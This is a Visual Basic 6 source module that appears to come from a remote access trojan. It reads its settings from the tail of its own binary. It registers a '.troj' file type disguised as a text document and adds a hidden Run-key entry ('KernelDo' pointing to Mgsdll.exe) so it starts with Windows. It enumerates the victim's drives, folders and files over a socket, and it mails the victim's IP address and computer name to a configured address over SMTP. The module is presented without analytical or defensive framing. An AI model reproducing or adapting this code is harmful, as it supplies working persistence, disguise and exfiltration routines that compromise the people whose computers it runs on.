Attribute VB_Name = "Module1"
Option Explicit
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Winsock1 As New Class1
Private Type rserver
   taa As String * 3
   ser As String * 16
   mai As String * 50
   asu As String * 30
   ras As String * 5
   mes As String * 62
   tit As String * 20
   por As String * 10
   pro As String * 50
End Type
Public serv As rserver
Public fso As New FileSystemObject
Public i As Long

Public Sub load(ByRef path As String)
Open path For Binary As #1
Get #1, LOF(1) - 246, serv.taa
Get #1, , serv.ser
Get #1, , serv.mai
Get #1, , serv.asu
Get #1, , serv.ras
Get #1, , serv.mes
Get #1, , serv.tit
Get #1, , serv.por
Get #1, , serv.pro
Close #1

End Sub
Public Function GetSystem() As String
Dim s As String
Dim res As Long
s = String(255, vbNullChar)
res = GetSystemDirectory(s, Len(s))
If res <> 0 Then GetSystem = Left(s, InStr(s, vbNullChar) - 1) & "\"
End Function
Public Function fusi()
Dim fso
Set fso = CreateObject("wscript.shell")
fso.regwrite "HKCR\.troj\", "trojfile"
fso.regwrite "HKCR\trojfile\", "Documento de texto"
fso.regwrite "HKCR\trojfile\Shell\Open\Command\", "%1 %*"
fso.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KernelDo", GetSystem & "Mgsdll.exe"
End Function
Public Sub Drivesl(path As String)
Dim uni As String
Dim fs As Drives
Dim f As Drive
Set fs = fso.Drives
For Each f In fs
Select Case f.DriveType
Case Fixed
uni = uni & "fix" & f & "\" & ";"
Case CDRom
uni = uni & "cdr" & f & "\" & ";"
Case Removable
uni = uni & "rem" & f & "\" & ";"
End Select
Next f
Winsock1.SendData "uni" & uni
DoEvents
Foldersl path
End Sub
Public Sub Foldersl(path As String)
Dim fol As String
Dim fs As Folders
Dim f As Folder
Dim fo As Folder
Set f = fso.GetFolder(path)
Set fs = f.SubFolders
For Each fo In fs
fol = fol & "fod" & fo.name & ";"
Next fo
Winsock1.SendData "fol" & fol
DoEvents
Filesl path
End Sub
Public Sub Filesl(path As String)
Dim fil As String
Dim f As File
Dim fo As Files
Set fo = fso.GetFolder(path).Files
For Each f In fo
fil = fil & "fie" & f.name & ";"
Next f
Winsock1.SendData "fil" & fil
DoEvents
End Sub
Public Sub Mail()
Winsock1.SendMail "helo" & vbCrLf
Winsock1.SendMail "mail from:" & "ErcUn@elfeo.com" & vbCrLf
Winsock1.SendMail "rcpt to:" & Trim(serv.mai) & vbCrLf
Winsock1.SendMail "data" & vbCrLf
Winsock1.SendMail "subject:" & Trim(serv.asu) & vbCrLf
Winsock1.SendMail "his I.P is: " & Winsock1.LocalIP & "  his Computername is: " & Winsock1.LocalGetName & vbCrLf & "." & vbCrLf
End Sub

